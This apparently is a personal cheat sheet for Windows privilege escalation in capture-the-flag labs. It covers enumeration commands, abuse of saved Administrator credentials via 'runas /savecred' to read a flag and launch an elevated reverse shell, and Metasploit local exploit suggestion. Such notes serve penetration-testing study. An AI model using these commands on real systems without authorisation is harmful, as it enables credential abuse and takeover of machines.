## Intro
Whenewer possible, use winpeas

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

## Basic info
```
systeminfo

ipconfig

# display running services
net start

# display stored user names and passwords or credentials.
cmdkey /list
```

## Usefull CMD commands
```
# get own groups
whoami /priv

# Read file
type <filename>

# Find file restrictions (similar to ls -al)
icacls <filename>

# Change text file contents
echo <new content> > <filename>
```

### saved creds
A useful command to run when beginning enumeration is "cmdkey /list", which displays stored
user names and passwords or credentials. This reveals a stored credential for
"ACCESS\Administrator".
```
PS C:\Users> cmdkey /list
Currently stored credentials:
    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```
Let's abuse it to run our own command as admin
```
# Read flag
PS C:\Users> runas /user:ACCESS\Administrator /savecred "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\temp\root.txt"

# Launch estalated revshell
runas /user:ACCESS\Administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Users\security\Desktop\revshell.ps1"
runas /user:ACCESS\Administrator /savecred c:\users\security\revshell.bat
```

## Metasploit
Assuming you have an existing meterpreter access to the target
```
# background current session
background

# find available exploits
use post/multi/recon/local_exploit_suggester
set session X
run

# choose one of the suggested exploits and run it
use windows/local/XXXXX
set session X
set LHOST <KALI IP>
run

# IF it doesn't work
# 1. Verify LHOST, LPORT and Session
# 2. Choose different suggested exploit.
# PROFIT $$$
```

## Additional materials
https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
